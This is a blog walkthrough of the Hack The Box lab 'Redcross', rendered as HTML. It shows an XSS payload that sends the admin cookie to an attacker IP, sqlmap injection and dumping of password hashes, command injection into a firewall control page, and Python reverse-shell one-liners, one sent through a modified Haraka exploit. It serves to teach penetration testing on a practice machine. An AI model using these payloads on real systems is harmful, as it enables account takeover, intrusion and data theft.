<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Redcross - Hack The Box - hackcommander.io</title>
<meta name="description" content="Redcross has a bit of everything: Cross-Site Scripting, a little bit of SQL injection, reviewing C source code to find a command injection vulnerability, light exploit modification and enumeration.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Redcross - Hack The Box">
<meta property="og:url" content="http://localhost:4000/htb-writeup-redcross/">


  <meta property="og:description" content="Redcross has a bit of everything: Cross-Site Scripting, a little bit of SQL injection, reviewing C source code to find a command injection vulnerability, light exploit modification and enumeration.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-redcross/redcross_logo.png">





  <meta property="article:published_time" content="2019-04-13T00:00:00+02:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-writeup-redcross/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Redcross - Hack The Box</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Redcross - Hack The Box">
    <meta itemprop="description" content="Redcross has a bit of everything: Cross-Site Scripting, a little bit of SQL injection, reviewing C source code to find a command injection vulnerability, light exploit modification and enumeration.">
    <meta itemprop="datePublished" content="April 13, 2019">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Redcross - Hack The Box
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-04-13T00:00:00+02:00">April 13, 2019 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-writeup-redcross/redcross_logo.png" alt="" /></p>

<p>Redcross has a bit of everything: Cross-Site Scripting, a little bit of SQL injection, reviewing C source code to find a command injection vulnerability, light exploit modification and enumeration.</p>

<h2 id="quick-summary">Quick summary</h2>

<ul>
  <li>XSS on contact form to get admin cookie</li>
  <li>SQLi to get user creds (rabbit hole, credentials are not useful)</li>
  <li>Find admin.redcross.htb sub-domain page</li>
  <li>Log in to admin page using admin session cookie we stole with XSS</li>
  <li>Create a shell account, log in to restricted shell, get source code of binary</li>
  <li>Command injection in firewall control module, get reverse shell as www-data</li>
  <li>Locate Haraka installation, use and modify exploit from exploit-db, gain shell as user penelope</li>
  <li>Get DB connection string from /etc/nss-pgsql.conf, create new user with GID 0</li>
  <li>Read /etc/nss-pgsql-root.conf, locate new DB connection string</li>
  <li>Create new user user with UID and GID 0, su to new user and gain root access</li>
</ul>

<h2 id="toolsexploitscves-used">Tools/Exploits/CVEs used</h2>

<ul>
  <li><a href="https://www.exploit-db.com/exploits/41162/">Haraka &lt; 2.8.9 - Remote Command Execution</a></li>
</ul>

<h3 id="portscan">Portscan</h3>

<p>Only SSH and web ports are open:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~# nmap -F 10.10.10.113
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-10 14:19 EST
Nmap scan report for 10.10.10.113
Host is up (0.019s latency).
Not shown: 97 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
</code></pre></div></div>

<h3 id="intra-webpage">Intra webpage</h3>

<p><a href="http://redcross.htb">http://redcross.htb</a> redirects to <a href="https://intra.redcross.htb/?page=login">https://intra.redcross.htb/?page=login</a> so we need to add that to our local hostfile.</p>

<p>The main page contains a simple login form:</p>

<p><img src="/assets/images/htb-writeup-redcross/redcross_login.png" alt="" /></p>

<p>At first glance, the login form doesn’t appear to be vulnerable to SQL injections but after trying a few user/password combinations, we are able to log in with the <code class="language-plaintext highlighter-rouge">guest/guest</code> credentials and we see the following message:</p>

<p><img src="/assets/images/htb-writeup-redcross/redcross_guest.png" alt="" /></p>

<p>So we know there’s at least two users: <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">guest</code>.</p>

<p>Because this is a messaging application, we can assume that admin will be checking messages periodically so we will try to get the admin session cookie with an XSS. Back on the main page, there is a contact form we can use to send messages to the administrator.</p>

<p><img src="/assets/images/htb-writeup-redcross/redcross_contact.png" alt="" /></p>

<p>The first two fields <code class="language-plaintext highlighter-rouge">subject</code> and <code class="language-plaintext highlighter-rouge">body</code> don’t appear to be vulnerable to XSS because the input is filtered. We get the following error message when we try to inject stuff like <code class="language-plaintext highlighter-rouge">&lt;script&gt;....</code>: <code class="language-plaintext highlighter-rouge">Oops! Someone is trying to do something nasty...</code></p>

<p>But the last field, <code class="language-plaintext highlighter-rouge">cbody</code> is not filtered and accepts any characters we send.</p>

<p>To test the XSS, we’ll try a very simple payload that’ll create an image on the page pointing to our attacker machine. The request will contain the <code class="language-plaintext highlighter-rouge">document.cookie</code> which hopefully contains the session cookie.</p>

<p>Payload: <code class="language-plaintext highlighter-rouge">&lt;script&gt;var myimg = new Image(); myimg.src = 'http://10.10.14.23/q?=' + document.cookie;&lt;/script&gt;</code></p>

<p>After a minute or so, we can see an incoming HTTP request made to our webserver, containg the admin session cookie:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.113 - - [11/Nov/2018 12:00:47] code 404, message File not found
10.10.10.113 - - [11/Nov/2018 12:00:47] "GET /q?=PHPSESSID=8e2u3570ceoa9vk2vofvgnibv3;%20LANG=EN_US;%20SINCE=1541955270;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1" 404 -
</code></pre></div></div>

<p>Using Firefox’s web developer tools, we can simply change the cookies and add all four values into our session, then hit refresh on the main page to log in as admin.</p>

<p><img src="/assets/images/htb-writeup-redcross/redcross_admincookie.png" alt="" /></p>

<h3 id="sql-injection-on-the-web-messaging-app">SQL injection on the web messaging app</h3>

<p>Based on the messages we see, we find the following users created in the database/system:</p>
<ul>
  <li>admin</li>
  <li>penelope</li>
  <li>charles</li>
  <li>guest</li>
</ul>

<p>Two parameters are vulnerable to SQL injections:</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">o</code> parameter in <code class="language-plaintext highlighter-rouge">GET /?o=2&amp;page=app</code></li>
</ol>

<p>Example:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?o=2'&amp;page=app HTTP/1.1

DEBUG INFO: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1' or dest like '2'') LIMIT 10' at line 1
</code></pre></div></div>

<ol>
  <li><code class="language-plaintext highlighter-rouge">LIMIT</code> cookie in <code class="language-plaintext highlighter-rouge">GET /?o=2&amp;page=app</code></li>
</ol>

<p>Example:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cookie: domain=admin; lang=EN_US; PHPSESSID=8e2u3570ceoa9vk2vofvgnibv3; LIMIT=10'

DEBUG INFO: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
</code></pre></div></div>

<p>Our best bet is to try to exploit the <code class="language-plaintext highlighter-rouge">o</code> parameter as exploiting the <code class="language-plaintext highlighter-rouge">LIMIT</code> cookie will be more difficult since we can’t do <code class="language-plaintext highlighter-rouge">UNION SELECT</code> after a <code class="language-plaintext highlighter-rouge">LIMIT</code> statement. We might be able to do something with <code class="language-plaintext highlighter-rouge">PROCEDURE ANALYSE</code> but since the box is rated medium/hard, I didn’t think this was going to be it.</p>

<p>The first thing we notice with sqlmap is it kills the webserver pretty quickly, so I assumed there is some kind of WAF rate-limiting the connections to the server. If we wait a bit, we are able to access the server again.</p>

<p>To use sqlmap, we will need to change the <code class="language-plaintext highlighter-rouge">delay</code> parameter to 1 second. It takes a long time but sqlmap eventually find the injection point:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~# sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1 --technique=UE
...
[13:00:14] [INFO] parsing HTTP request from 'login.req'
[13:00:14] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.02' from file '/usr/share/sqlmap/txt/user-agents.txt'
[13:00:14] [INFO] testing connection to the target URL
sqlmap got a 301 redirect to 'https://intra.redcross.htb/?o=2&amp;page=app'. Do you want to follow? [Y/n] y
[13:00:17] [INFO] heuristic (basic) test shows that GET parameter 'o' might be injectable (possible DBMS: 'MySQL')
[13:00:18] [INFO] heuristic (XSS) test shows that GET parameter 'o' might be vulnerable to cross-site scripting (XSS) attacks
[13:00:18] [INFO] testing for SQL injection on GET parameter 'o'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) value? [Y/n] 
[13:00:19] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:00:20] [WARNING] reflective value(s) found and filtering out
[13:01:17] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:02:14] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:03:11] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:04:08] [INFO] testing 'MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:05:04] [INFO] testing 'MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:06:01] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:06:20] [INFO] GET parameter 'o' is 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[13:06:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:06:20] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[13:06:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:06:42] [INFO] target URL appears to be UNION injectable with 4 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
[14:12:39] [INFO] testing 'MySQL UNION query (63) - 21 to 40 columns'
[14:13:03] [INFO] testing 'MySQL UNION query (63) - 41 to 60 columns'
[14:13:28] [INFO] testing 'MySQL UNION query (63) - 61 to 80 columns'
[14:13:53] [INFO] testing 'MySQL UNION query (63) - 81 to 100 columns'
[14:14:19] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
GET parameter 'o' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 469 HTTP(s) requests:
---
Parameter: o (GET)
    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: o=2') AND (SELECT 6000 FROM(SELECT COUNT(*),CONCAT(0x71717a7671,(SELECT (ELT(6000=6000,1))),0x716a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- scxH&amp;page=app
---
[14:33:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL &gt;= 5.0
[14:33:52] [INFO] fetched data logged to text files under '/root/.sqlmap/output/intra.redcross.htb'

[*] shutting down at 14:33:52
</code></pre></div></div>

<p>Listing databases: <code class="language-plaintext highlighter-rouge">sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -T users --dbs</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[14:38:26] [INFO] used SQL query returns 2 entries
[14:38:27] [INFO] retrieved: information_schema
[14:38:28] [INFO] retrieved: redcross
available databases [2]:
[*] information_schema
[*] redcross
</code></pre></div></div>

<p>Listing tables from <code class="language-plaintext highlighter-rouge">redcross</code> DB: <code class="language-plaintext highlighter-rouge">sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -D redcross --tables</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[14:38:41] [INFO] retrieved: messages
[14:38:42] [INFO] retrieved: requests
[14:38:44] [INFO] retrieved: users
Database: redcross
[3 tables]
+----------+
| messages |
| requests |
| users    |
+----------+
</code></pre></div></div>

<p>Dumping list of users: <code class="language-plaintext highlighter-rouge">sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -D redcross -T users --dump</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Database: redcross
Table: users
[5 entries]
+----+------+------------------------------+----------+--------------------------------------------------------------+
| id | role | mail                         | username | password                                                     |
+----+------+------------------------------+----------+--------------------------------------------------------------+
| 1  | 0    | admin@redcross.htb           | admin    | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. |
| 2  | 1    | penelope@redcross.htb        | penelope | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS |
| 3  | 1    | charles@redcross.htb         | charles  | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i |
| 4  | 100  | tricia.wanderloo@contoso.com | tricia   | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. |
| 5  | 1000 | non@available                | guest    | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi |
+----+------+------------------------------+----------+--------------------------------------------------------------+
</code></pre></div></div>

<p>The password are stored with the bcrypt password hashing function, which is very slow to brute force. After letting hashcat (<code class="language-plaintext highlighter-rouge">hashcat -a 0 -m 3200</code>) run for some time I was able to recover the following hashes:</p>

<ul>
  <li>guest / guest</li>
  <li>penelope / alexx</li>
  <li>charles / cookiemonster</li>
</ul>

<p>None of them work to log in with SSH but we are able to see a few additional messages when logging in with the web messaging application.</p>

<blockquote>
  <p>Please could you check the admin webpanel? idk what happens but when I’m checking the messages, alerts popping everywhere!! Maybe a virus?</p>
</blockquote>

<blockquote>
  <p>Hey, my chief contacted me complaining about some problem in the admin webapp. I thought that you reinforced security on it… Alerts everywhere!!</p>
</blockquote>

<p>That may be a hint there is another hidden page/sub-domain…</p>

<h3 id="admin-web-page">Admin web page</h3>

<p>There’s another host <code class="language-plaintext highlighter-rouge">admin.redcross.htb</code> that displays a totally different application:</p>

<p><img src="/assets/images/htb-writeup-redcross/redcross_adminpage_login.png" alt="" /></p>

<p>The same cookie we stole from the admin can be used here to log in:</p>

<p><img src="/assets/images/htb-writeup-redcross/redcross_adminpage_cookie.png" alt="" /></p>

<p>Under the user management menu, we can see and add users to the system:</p>

<p><img src="/assets/images/htb-writeup-redcross/usermgmt.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-redcross/newuser.png" alt="" /></p>

<p>We can SSH with the new user we created:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@ragingunicorn:~#</span><span class="w"> </span>ssh snowscan@10.10.10.113
<span class="go">snowscan@10.10.10.113's password: 
</span><span class="gp">Linux redcross 4.9.0-6-amd64 #</span>1 SMP Debian 4.9.88-1+deb9u1 <span class="o">(</span>2018-05-07<span class="o">)</span> x86_64
<span class="go">
</span><span class="gp">The programs included with the Debian GNU/Linux system are free software;</span><span class="w">
</span><span class="go">the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
</span><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">bin  dev  etc  home  lib  lib64  root  usr
</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=2020 gid=1001(associates) groups=1001(associates)
</span></code></pre></div></div>

<p>This is some kind of chroot jail, there’s not much we can do here. However we do find a single C source file: <code class="language-plaintext highlighter-rouge">iptctl.c</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ pwd
/home/public/src
$ cat iptctl.c 
/*
 * Small utility to manage iptables, easily executable from admin.redcross.htb
 * v0.1 - allow and restrict mode
 * v0.3 - added check method and interactive mode (still testing!)
 */
...
</code></pre></div></div>

<p>The file contains the program code that is called by the firewall management application on the admin page:</p>

<p><img src="/assets/images/htb-writeup-redcross/firewall_control.png" alt="" /></p>

<p>Whenever we add/delete an IP from the firewall ACL’s, the PHP code does a system() call to run the <code class="language-plaintext highlighter-rouge">iptctl</code> application and make changes to the firewall rules. If we add a semi-colon in the <code class="language-plaintext highlighter-rouge">id</code> parameter we are able to inject commands and gain code execution.</p>

<p>Example payload like the following: <code class="language-plaintext highlighter-rouge">ip=1;id&amp;action=deny</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usage: /opt/iptctl/iptctl allow|restrict|show IP
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre></div></div>

<p>Since we now have RCE, we can use a standard python reverse shell command to get shell on the system.</p>

<p>Payload: <code class="language-plaintext highlighter-rouge">ip=1;python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.23",4444))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/sh","-i"])%3b'&amp;action=deny</code></p>

<p>And we get a shell!</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@ragingunicorn:~/hackthebox/Machines/Redcross#</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 4444
<span class="go">listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.113] 51712
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
<span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class="gp">$</span><span class="w"> </span><span class="nb">hostname</span>
<span class="go">redcross
</span></code></pre></div></div>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@redcross:/home/penelope$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> 
<span class="go">ls -l 
total 8
drwxrwx--- 6 penelope mailadm  4096 Jun  7 17:59 haraka
-rw-r----- 1 root     penelope   33 Jun  7 18:18 user.txt
</span><span class="gp">www-data@redcross:/home/penelope$</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">cat user.txt
cat: user.txt: Permission denied
</span></code></pre></div></div>

<p>We still can’t read <code class="language-plaintext highlighter-rouge">user.txt</code> since it’s owned by <code class="language-plaintext highlighter-rouge">penelope</code>… Gotta try harder I guess.</p>

<h3 id="priv-esc-to-penelope">Priv esc to penelope</h3>

<p>Penelope’s home directory contains the <code class="language-plaintext highlighter-rouge">haraka</code> directory. Haraka is an SMTP email server written in Node.js and contains at least one vulnerability according to Exploit-DB:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----------------------------------------
Haraka &lt; 2.8.9 - Remote Command Execution
/linux/remote/41162.py
-----------------------------------------
Shellcodes: No Result
</code></pre></div></div>

<p>The server is running but doesn’t appear to be listening on port 25:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@redcross:/home/penelope$</span><span class="w"> </span>ps waux | <span class="nb">grep </span>haraka
<span class="go">ps waux | grep haraka
penelope  1199  0.0  1.9 994608 20068 ?        Ssl  09:47   0:02 node /usr/bin/haraka -c /home/penelope/haraka
</span></code></pre></div></div>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@redcross:/home/penelope$</span><span class="w"> </span>telnet 127.0.0.1 25
<span class="go">telnet 127.0.0.1 25
Trying 127.0.0.1...
telnet: Unable to connect to remote host: Connection refused
</span><span class="gp">www-data@redcross:/home/penelope$</span><span class="w"> </span>netstat <span class="nt">-panut</span>
<span class="go">netstat -panut
bash: netstat: command not found
</span></code></pre></div></div>

<p>Netstat is not installed so I went back to the firewall control page added a whitelist entry for my IP address and scanned the box again with nmap:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@ragingunicorn:~#</span><span class="w"> </span>nmap <span class="nt">-p-</span> 10.10.10.113
<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-11 15:18 EST
Nmap scan report for intra.redcross.htb (10.10.10.113)
Host is up (0.018s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
1025/tcp open  NFS-or-IIS
5432/tcp open  postgresql
</span></code></pre></div></div>

<p>1025 looks interesting but we can’t connect to it with telnet:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@ragingunicorn:~#</span><span class="w"> </span>telnet 10.10.10.113 25
<span class="go">Trying 10.10.10.113...
telnet: Unable to connect to remote host: Connection refused
</span></code></pre></div></div>

<p>We can connect locally though:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@ragingunicorn:~#</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 4444
<span class="go">listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.113] 52064
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
<span class="gp">$</span><span class="w"> </span>telnet 127.0.0.1 1025
<span class="go">Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
220 redcross ESMTP Haraka 2.8.8 ready
quit
</span></code></pre></div></div>

<p>The exploit needs to be modified slightly because the port is hardcoded and needs to be changed to 1025.</p>

<p>Line 123 needs to be changed to the following:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTP</span><span class="p">(</span><span class="n">mailserver</span><span class="p">,</span><span class="mi">1025</span><span class="p">)</span>
<span class="p">...</span>
</code></pre></div></div>

<p>We can use vi to create the exploit .py file in /dev/shm, then execute it to spawn a reverse shell:</p>

<p>Note: The email address must contain the <code class="language-plaintext highlighter-rouge">redcross.htb</code> domain.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@redcross:/dev/shm$</span><span class="w"> </span>./h.py <span class="nt">-c</span> <span class="s2">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\"</span><span class="s2">10.10.14.23</span><span class="se">\"</span><span class="s2">,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\"</span><span class="s2">/bin/sh</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">-i</span><span class="se">\"</span><span class="s2">]);'"</span> <span class="nt">-t</span> penelope@redcross.htb <span class="nt">-f</span> penelope@redcross.htb <span class="nt">-m</span> redcross
<span class="gp">htb -m redcrossn/sh\",\"-i\"]);</span><span class="s1">'" -t penelope@redcross.htb -f penelope@redcross.h
</span><span class="gp">#</span><span class="s1">#     ##    ###    ########     ###    ##    ## #### ########  #### 
</span><span class="gp">#</span><span class="s1">#     ##   ## ##   ##     ##   ## ##   ##   ##   ##  ##     ##  ##  
</span><span class="gp">#</span><span class="s1">#     ##  ##   ##  ##     ##  ##   ##  ##  ##    ##  ##     ##  ##  
</span><span class="gp">#</span><span class="s1">######## ##     ## ########  ##     ## #####     ##  ########   ##  
</span><span class="gp">#</span><span class="s1">#     ## ######### ##   ##   ######### ##  ##    ##  ##   ##    ##  
</span><span class="gp">#</span><span class="s1">#     ## ##     ## ##    ##  ##     ## ##   ##   ##  ##    ##   ##  
</span><span class="gp">#</span><span class="s1">#     ## ##     ## ##     ## ##     ## ##    ## #### ##     ## #### 
</span><span class="go">                                                 
-o- by Xychix, 26 January 2017 ---
-o- xychix [at] hotmail.com ---
-o- exploit haraka node.js mailserver &lt;= 2.8.8 (with attachment plugin activated) --

-i- info: https://github.com/haraka/Haraka/pull/1606 (the change that fixed this)

